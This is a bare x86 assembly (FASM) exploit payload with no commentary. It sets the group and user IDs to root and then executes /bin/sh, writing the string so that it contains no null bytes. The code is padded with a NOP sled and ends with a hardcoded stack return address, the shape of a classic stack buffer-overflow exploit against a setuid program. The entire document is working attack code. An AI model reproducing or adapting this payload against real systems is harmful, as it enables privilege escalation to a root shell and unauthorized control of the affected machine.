
format binary
use32

xor eax, eax
mov al, $2E
xor ebx, ebx
int $80
xor eax, eax
mov al, $17
xor ebx, ebx
int $80
xor eax, eax
push "/sh_"
xor byte [esp+$03], '_'
push "/bin"
mov ebx, esp
xor edx, edx
push edx
push ebx
mov ecx, esp
mov al, $0B
int $80

times ($8C-($-$$)) db $90

dd $BFFFFD60
